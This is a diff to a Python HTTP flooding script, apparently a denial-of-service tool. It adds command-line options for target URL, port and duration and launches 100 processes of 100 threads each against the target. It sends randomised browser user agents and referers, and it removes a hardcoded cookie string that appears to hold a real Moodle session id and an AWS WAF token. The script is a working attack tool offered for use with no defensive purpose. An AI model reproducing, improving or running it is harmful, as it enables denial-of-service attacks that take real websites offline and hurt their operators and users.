@@ -4,12 +4,22 @@ import threading
 import ssl
 import multiprocessing
 import requests
+import sys
+import time
 
-ip = str(input("[IP]:"))
-port = int(input("[PORT]:"))
+ip = ""
+port = 80
+period = 10
+for n,args in enumerate(sys.argv):
+    if args=="-url":
+        ip = str(sys.argv[n+1])
+    if args=="-p":
+        port = int(sys.argv[n+1])
+    if args=="-t":
+        period = int(sys.argv[n+1])
 
 Choice = random.choice
-go = threading.Event()
+
 useragents = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
@@ -70,7 +80,7 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
-cookie_list = "_ga=GA1.2.101739958.1651700637; _gid=GA1.2.943656058.1651700637; MoodleSession=20p6m55i0v8r3do9r74m9sjuak; aws-waf-token=22301767-3df8-4c94-a6fe-4821d7288e8c:BgoAcBOYzwQAAAAA:XnICKdYmA+LqIFA+wfB6GLqXjb08belSHKVfDi10/Ad8csB5mhERKKTUBNCNI3MDO7zSm1NrQp1W88GxRLOHa5wLRP31LsFSYK+5KtGr96O5fSMTICGHT9rFY/Y1teA="
+cookie_list = ""
 
 def rqheader():
     connection = "Connection: Keep-Alive\r\n"
@@ -107,7 +117,19 @@ def attack():
             s.close()
             pass
 
-for y in range(100):
-    th = multiprocessing.Process (target=attack)
-    go.set()
-    th.start()
+def build_thread():
+	for _ in range(100):
+		bth = threading.Thread(target=attack)
+		bth.start()
+
+def build_process(process_num):
+	for y in range(process_num):
+		th = multiprocessing.Process (target=build_thread)
+		go.clear()
+		go.set()
+		th.start()
+
+go = threading.Event()
+build_process(100)
+print("[ATTACKING!!!]")
+time.sleep(period)
